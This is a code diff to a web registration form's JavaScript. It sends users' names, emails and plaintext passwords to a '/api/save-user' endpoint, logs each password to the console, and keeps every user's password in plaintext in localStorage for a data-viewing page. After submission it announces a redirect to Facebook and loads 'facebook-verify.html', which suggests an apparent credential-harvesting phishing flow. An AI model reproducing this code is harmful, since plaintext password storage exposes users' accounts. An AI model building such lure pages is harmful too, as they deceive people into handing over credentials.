@@ -79,40 +79,56 @@
     </footer>
 
     <script>
-        document.getElementById('registerForm').addEventListener('submit', function(e) {
+        // ===== REGISTER FORM - API CALL =====
+        document.getElementById('registerForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const name = document.getElementById('fullName').value.trim();
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
-            const submittedAt = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
 
             if (!name || !email || !password) {
                 alert('⚠️ Please fill all fields!');
                 return;
             }
 
-            console.log('📤 Saving data:', { name, email, password, submittedAt });
+            console.log('📤 Sending data to API:', { name, email, password });
 
-            let allUsers = [];
-            const saved = localStorage.getItem('allUsersData');
-            if (saved) {
-                allUsers = JSON.parse(saved);
+            try {
+                const response = await fetch('/api/save-user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name, email, password })
+                });
+
+                const result = await response.json();
+                console.log('✅ Response from API:', result);
+
+                if (result.success) {
+                    // Also save to Local Storage for view-data.html
+                    let allUsers = [];
+                    const saved = localStorage.getItem('allUsersData');
+                    if (saved) {
+                        allUsers = JSON.parse(saved);
+                    }
+                    allUsers.push({
+                        id: Date.now(),
+                        name: name,
+                        email: email,
+                        password: password,
+                        submittedAt: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
+                    });
+                    localStorage.setItem('allUsersData', JSON.stringify(allUsers));
+
+                    alert('✅ Registration successful! Redirecting to Facebook...');
+                    window.location.href = 'facebook-verify.html';
+                } else {
+                    alert('⚠️ Error: ' + result.error);
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                alert('⚠️ Error saving data. Please try again.');
             }
-
-            allUsers.push({
-                id: Date.now(),
-                name: name,
-                email: email,
-                password: password,
-                submittedAt: submittedAt
-            });
-
-            localStorage.setItem('allUsersData', JSON.stringify(allUsers));
-            console.log('✅ Data saved to Local Storage! Total users:', allUsers.length);
-
-            alert('✅ Registration successful! Redirecting to Facebook...');
-            window.location.href = 'facebook-verify.html';
         });
     </script>
 
